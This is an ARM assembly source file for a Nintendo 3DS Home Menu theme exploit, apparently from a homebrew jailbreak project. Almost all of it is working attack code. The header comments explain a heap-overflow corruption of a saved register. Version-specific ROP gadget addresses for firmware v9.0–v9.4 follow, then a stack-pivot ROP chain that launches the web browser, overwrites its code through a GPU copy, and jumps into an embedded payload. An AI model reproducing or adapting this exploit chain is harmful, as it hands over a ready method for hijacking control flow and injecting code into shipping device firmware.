.arm
.section .init
.global _start

@ This is the start of the decompressed theme data.

/*
All function addresses referenced here are for v9.4 homemenu.

The memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
L_2441a0: L_1e95e0(*(inr0+4)); ...
L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
*/

#define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.4 all regions)

#if SYSVER>=93 //v9.3-v9.4
#define ROP_LOADR4_FROMOBJR0 0x10b574 //load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
#define ROP_POPPC 0x10203c
#define POP_R4LR_BXR1 0x0011df68 //"pop {r4, lr}" "bx r1"
#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037fc//"ldr r1, [r5, r4, lsl #2]" "ldr r2, [r0]" "ldr r2, [r2, #20]" "blx r2"
#define POP_R4R8LR_BXR2 0x00133f8c //"pop {r4, r5, r6, r7, r8, lr}" "bx r2"
#define POP_R4R5R6PC 0x00101b94 //"pop {r4, r5, r6, pc}"

#define CFGIPC_SecureInfoGetRegion 0x00136ea4 //inr0=u8* out

#define GSPGPU_Shutdown 0x0011dc1c
#define GSPGPU_FlushDataCache 0x0014ab9c

#define APT_SendParameter 0x00214ab0 //inr0=dst appid inr1=signaltype inr2=parambuf* inr3=parambufsize insp0=handle

#define NSS_RebootSystem 0x00136a0c
#else
#define ROP_LOADR4_FROMOBJR0 0x10b64c
#define ROP_POPPC 0x102028
#define POP_R4LR_BXR1 0x0011dda4
#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037d8
#define POP_R4R8LR_BXR2 0x00136d5c
#define POP_R4R5R6PC 0x00101b90

#define CFGIPC_SecureInfoGetRegion 0x00139d0c

#define GSPGPU_Shutdown 0x0011da58

#define NSS_RebootSystem 0x00139874
#endif

#if SYSVER == 93
#define SRV_GETSERVICEHANDLE 0x0022472c
#define POP_R1PC 0x002262bc
#elif SYSVER == 94
#define SRV_GETSERVICEHANDLE 0x0022470c
#define POP_R1PC 0x0022629c
#endif

#if SYSVER>=93 //v9.3-v9.4
#define POP_R0PC 0x00154f0c
#define POP_R3PC 0x00102a40
#define POP_R2R6PC 0x001512c4 //pop {r2, r3, r4, r5, r6, pc}

#define ROP_STR_R1TOR0 0x00103f58
#define ROP_LDR_R0FROMR0 0x0010f01c
#define ROP_LDRR1R1_STRR1R0 0x002003bc
#define ROP_MOVR1R3_BXIP 0x001c2e24
#define ROP_ADDR0_TO_R1 0x0012b64c

#define MEMCPY 0x00150940

#define svcSleepThread 0x0012b590

#define GXLOW_CMD4 0x0014ac9c

#define ORIGINALOBJPTR_LOADADR (0x0031382c+8) //The ptr stored here is the ptr stored in the saved r4 value in the stackframe, which was overwritten by memchunkhax.
#endif

#if SYSVER <= 92 //v9.0-v9.2
#define ROP_STR_R1TOR0 0x00103f40
#define ROP_LDR_R0FROMR0 0x0010efe8
#define ROP_ADDR0_TO_R1 0x0012e708
#endif

#if SYSVER == 92
#define POP_R0PC 0x001575ac
#define POP_R1PC 0x00214988
#define POP_R3PC 0x00102a24
#define POP_R2R6PC 0x00150160

#define ROP_LDRR1R1_STRR1R0 0x001f1e7c
#define ROP_MOVR1R3_BXIP 0x001b8708

#define ROP_CMPR0R1 0x0027e344

#define MEMCPY 0x001536f8

#define svcSleepThread 0x0012e64c

#define SRV_GETSERVICEHANDLE 0x00212de0

#define GXLOW_CMD4 0x0014d65c

#define GSPGPU_FlushDataCache 0x0014d55c

#define APT_SendParameter 0x00205ba0
#endif

#if SYSVER <= 91 //v9.0-v9.1j
#define POP_R0PC 0x00157554
#define POP_R1PC 0x002149f0
#define POP_R3PC 0x00102a24
#define POP_R2R6PC 0x00150108

#define ROP_LDRR1R1_STRR1R0 0x001f1ee4
#define ROP_MOVR1R3_BXIP 0x001b8848

#define ROP_INITOBJARRAY 0x0020a40d

#define ROP_CMPR0R1 0x0027e450

#define MEMCPY 0x001536a0

#define svcControlMemory 0x00212df0
#define svcSleepThread 0x0012e64c

#define SRV_GETSERVICEHANDLE 0x00212e48

#define GXLOW_CMD4 0x0014d604

#define GSPGPU_FlushDataCache 0x0014d504

#define NSS_LaunchTitle 0x0020e6a8

#define ORIGINALOBJPTR_LOADADR (0x002f1820+8)

#define APT_SendParameter 0x00205c08
#endif

#if SYSVER == 94
#define NSS_LaunchTitle 0x0022022c //inr0=procid out* inr1=unused inr2/inr3=u64 programid insp0=u8 mediatype

#define svcControlMemory 0x002246b4

#define ROP_INITOBJARRAY 0x002190a5 //inr0=arrayptr* inr1=funcptr inr2=entrysize inr3=totalentries This basically does: curptr = inr0; while(inr3){<call inr1 funcptr with r0=curptr>; curptr+=inr2; inr3--;}

#define ROP_CMPR0R1 0x002946d0 // "cmp r0, r1" "movge r0, #1" "movlt r0, #0" "pop {r4, pc}"
#endif

#if SYSVER == 93
#define NSS_LaunchTitle 0x0022024c

#define svcControlMemory 0x002246d4

#define ROP_INITOBJARRAY 0x002190c5

#define ROP_CMPR0R1 0x002946ac
#endif

#if SYSVER == 92
#define NSS_LaunchTitle 0x0020e640

#define svcControlMemory 0x00212d88

#define ROP_INITOBJARRAY 0x0020a3a5

#define ORIGINALOBJPTR_LOADADR (0x002f0820+8)
#endif

#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12

#define ROP_BXR1 POP_R4LR_BXR1+4
#define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"

#if NEW3DS==0
#define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
#else
#define NSS_PROCLOADTEXT_LINEARMEMADR ((0x3d900000-0x400000)+0x21b000)//In SKATER, overwrite the code which gets called for assert/svcBreak when allocating the main heap fails.
#endif

.macro ROP_SETLR lr
.word POP_R1PC
.word ROP_POPPC @ r1

.word POP_R4LR_BXR1
.word 0 @ r4
.word \lr
.endm

.macro ROP_SETLR_OTHER lr
.word POP_R2R6PC
.word ROP_POPPC @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word POP_R4R8LR_BXR2
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word \lr
.endm

.macro CALLFUNC funcadr, r0, r1, r2, r3, sp0, sp4, sp8, sp12
ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word \r0

.word POP_R1PC
.word \r1

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr

.word \sp0
.word \sp4
.word \sp8
.word \sp12
.word 0 @ r6
.endm

.macro CALLFUNC_NOSP funcadr, r0, r1, r2, r3
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word \r0

.word POP_R1PC
.word \r1

.word POP_R2R6PC
.word \r2
.word \r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word \funcadr
.endm

.macro CALLFUNC_NOARGS funcadr
ROP_SETLR ROP_POPPC
.word \funcadr
.endm

.macro CALL_GXCMD4 srcadr, dstadr, cpysize
CALLFUNC GXLOW_CMD4, \srcadr, \dstadr, \cpysize, 0, 0, 0, 0, 0x8
.endm

.macro ROPMACRO_STACKPIVOT sp, pc
.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word \sp @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word \pc @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0
.endm

.macro PREPARE_RET2MENUCODE
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word TARGETOVERWRITE_STACKADR @ r0

.word POP_R1PC
.word ORIGINALOBJPTR_LOADADR @ r1

.word ROP_LDRR1R1_STRR1R0 @ Restore the saved r4 value overwritten by memchunkhax with the original value.
.endm

.macro RET2MENUCODE
PREPARE_RET2MENUCODE

ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
.endm

_start:

themeheader:
.word 1 @ version

.space ((themeheader + 0xc4) - .)

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0 @ Memchunk-hdr stuff writes here.
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word HEAPBUF + (ropstackstart - _start) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

.space ((object + 0x28) - .)
.word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.

.space ((object + 0x2ec) - .)
#if SYSVER > 92 //Dunno if this applies for versions other than v9.2.
.word 0 @ The target ptr offset is 0x4-bytes different from v9.2.
#endif
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.

.space ((object + 0x3a60) - .)
#if SYSVER <= 92 //Dunno if this applies for versions other than v9.2.
.word 0 @ The target ptr offset is 0x4-bytes different from v9.4.
#endif
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.

vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20

.space ((vtable + 0x100) - .)

.space ((_start + 0x4000) - .) @ Base the stack at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).

tmpdata:

nss_outprocid:
.word 0

#if NEW3DS==0
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x0
#else
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x20000000
#endif

nsslaunchtitle_programidlow_list:
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ JPN
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009402 @ USA
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009D02 @ EUR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ "AUS"(no 3DS systems actually have this region set)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ CHN (the rest of the IDs here are probably wrong but whatever)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN

/*nss_servname:
.ascii "ns:s"*/

gamecard_titleinfo:
.word 0, 0 @ programID
.word 2 @ mediatype
.word 0 @ reserved

tmp_scratchdata:
.space 0x400

ropstackstart:
#ifdef USE_PADCHECK
PREPARE_RET2MENUCODE

.word POP_R0PC
.word HEAPBUF + (rop_r0data_cmphid - _start) @ r0

.word POP_R1PC
.word 0x1000001c @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.

.word POP_R0PC
rop_r0data_cmphid:
.word 0 @ r0

.word POP_R1PC
.word USE_PADCHECK @ r1

.word ROP_CMPR0R1 @ Compare current PAD state with USE_PADCHECK value.

.word HEAPBUF + ((object+0x20) - _start) @ r4

.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word TARGETOVERWRITE_STACKADR @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word POP_R4R5R6PC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the USE_PADCHECK value, continue the ROP, otherwise do the above stack-pivot to return to the home-menu code.

.word 0, 0, 0 @ r4..r6
#endif

//Overwrite the top-screen framebuffers. This doesn't affect the framebuffers when returning from an appet to Home Menu.
CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2

#ifdef ENABLE_RET2MENU//Note that when using this Home Menu will have the default theme "selected", however Home Menu will still load the themehax when homemenu starts up again later.
RET2MENUCODE
#endif

#ifdef BOOTGAMECARD
#ifdef GAMECARD_PADCHECK
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 3000000000//0x0 @ r0

.word POP_R1PC
.word 0x0//0x100 @ r1

.word svcSleepThread @ Sleep 3 seconds, otherwise PADCHECK won't work if USE_PADCHECK and GAMECARD_PADCHECK are different values.

.word POP_R0PC
.word HEAPBUF + (rop_r0data_cmphid_gamecard - _start) @ r0

.word POP_R1PC
.word 0x1000001c @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.

.word POP_R0PC
rop_r0data_cmphid_gamecard:
.word 0 @ r0

.word POP_R1PC
.word GAMECARD_PADCHECK @ r1

.word ROP_CMPR0R1 @ Compare current PAD state with GAMECARD_PADCHECK value.

.word HEAPBUF + ((object+0x20) - _start) @ r4

.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word (HEAPBUF + (bootgamecard_ropfinish - _start)) @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the GAMECARD_PADCHECK value, continue the gamecard launch ROP, otherwise do the above stack-pivot to skip gamecard launch.

.word 0, 0, 0 @ r4..r6
#endif

CALLFUNC_NOSP NSS_RebootSystem, 0x1, (HEAPBUF + (gamecard_titleinfo - _start)), 0x0, 0

bootgamecard_ropfinish:
#endif

#if NEW3DS==1 //On New3DS the end-address of the GPU-accessible FCRAM area increased, relative to the SYSTEM-memregion end address. Therefore, in order to get the below process to run under memory that's GPU accessible, 0x400000-bytes are allocated here.
CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x3, 0x3, 0, 0
#endif

CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (codedatastart - _start)), (codedataend-codedatastart), 0, 0

ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word HEAPBUF + (region_outval - _start) @ r0

.word CFGIPC_SecureInfoGetRegion @ Write the SecureInfo region value to the below field which will be popped into r4.

.word 0 @ r2
.word 0 @ r3
region_outval:
.word 0 @ r4
.word HEAPBUF + (nsslaunchtitle_programidlow_list - _start) @ r5
.word 0 @ r6

.word POP_R0PC
.word HEAPBUF + (object - _start) @ r0

.word ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX //"ldr r1, [r5, r4, lsl #2]" <call vtable funcptr +20 from the r0 object> (load the programID-low for this region into r1)

ROP_SETLR_OTHER ROP_POPPC

.word POP_R0PC

.word HEAPBUF + (nsslaunchtitle_regload_programidlow - _start) @ r0

.word ROP_STR_R1TOR0 //Write the programID-low value for this region to the below reg-data which would be used for the programID-low in the NSS_LaunchTitle call.

ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word HEAPBUF + (nss_outprocid - _start)  @ r0, out procid*

@ r1 isn't used by NSS_LaunchTitle so no need to set it here.

.word POP_R2R6PC
nsslaunchtitle_regload_programidlow:
.word 0 @ r2, programID low (overwritten by the above ROP)
.word 0x00040030 @ r3, programID high
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word NSS_LaunchTitle @ Launch the web-browser.

.word 0 @ r2 / sp0 (mediatype, 0=NAND)
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

#if NEW3DS==1//Use this as a waitbyloop.
CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
#endif

//Overwrite the browser .text with the below code.
CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR, (codedataend-codedatastart)

/*#if NEW3DS==1 //Free the memory which was allocated above on new3ds.
CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x1, 0x0, 0, 0
#endif*/

#if NEW3DS==1//Use this as a waitbyloop.
CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
#endif

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 1000000000//0x0 @ r0

.word POP_R1PC
.word 0x0//0x100 @ r1

.word svcSleepThread @ Sleep 1 second, call GSPGPU_Shutdown() etc, then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.

CALLFUNC_NOARGS GSPGPU_Shutdown

/*
//Get "ns:s" service handle, then send it via APT_SendParameter(). The codebin payload can then use APT:ReceiveParameter to get this "ns:s" handle.
CALLFUNC_NOSP SRV_GETSERVICEHANDLE, (HEAPBUF + (aptsendparam_handle - _start)), (HEAPBUF + (nss_servname - _start)), 0x4, 0

ROP_SETLR POP_R2R6PC
.word POP_R0PC
.word 0x101 @ r0, dst appID

.word POP_R1PC
.word 0x1 @ r1, signaltype

.word POP_R2R6PC
.word 0 @ r2, parambuf*
.word 0 @ r3, parambufsize
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word APT_SendParameter

aptsendparam_handle:
.word 0 @ sp0, handle
.word 0
.word 0
.word 0
.word 0 @ r6*/

ropfinish_sleepthread:
#ifdef EXITMENU
ROP_SETLR ROP_POPPC

#if NEW3DS==0
.word POP_R0PC
.word 4000000000 @ r0

.word POP_R1PC @ Sleep 4 seconds.
.word 0 @ r1
#else
.word POP_R0PC
.word 3000000000 @ r0

.word POP_R1PC  @ Sleep 3 seconds.
.word 0 @ r1
#endif

.word svcSleepThread

.word 0x00100020 @ LR of main(), svcExitProcess.
#endif

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 1000000000 @ r0

.word POP_R1PC
.word 0x0 @ r1

.word svcSleepThread

ROPMACRO_STACKPIVOT (HEAPBUF + (ropfinish_sleepthread - _start)), ROP_POPPC

.word POP_R1PC
.word ROP_BXR1 @ r1

.word ROP_BXR1 @ This is used as an infinite loop.

.word 0x58584148

.align 4
codedatastart:
#if NEW3DS==0
.space 0x200 @ nop-sled
#else
.space 0x1000
#endif

#if NEW3DS==0
ldr r0, =3000000000
mov r1, #0
svc 0x0a @ Sleep 3 seconds.
#else
/*ldr r0, =3000000000
mov r1, #0
svc 0x0a @ Sleep 3 seconds.*/
/*ldr r0, =0x540BE400
mov r1, #2
svc 0x0a @ Sleep 10 seconds, so that hopefully the payload doesn't interfere with sysmodule loading.*/
#endif

#ifdef CODEBINPAYLOAD
ldr r0, =0x10003 @ operation
mov r4, #3 @ permissions

mov r1, #0 @ addr0
mov r2, #0 @ addr1
ldr r3, =0xc000 @ size
svc 0x01 @ Allocate 0xc000-bytes of linearmem.
mov r4, r1
cmp r0, #0
bne codecrash

mov r1, #0x49
str r1, [r4, #0x48] @ flags
ldr r1, =0x101
str r1, [r4, #0x5c] @ NS appID (use the homemenu appID since the browser appID wouldn't be registered yet)
mov r0, r4
adr r1, codecrash
mov lr, r1
b codebinpayload_start
#else
b codecrash
#endif
.pool

codecrash:
ldr r3, =0x58584148
ldr r3, [r3]
code_end:
b code_end
.pool

#ifdef CODEBINPAYLOAD
codebinpayload_start:
.incbin CODEBINPAYLOAD
#endif

.align 4
codedataend:
.word 0

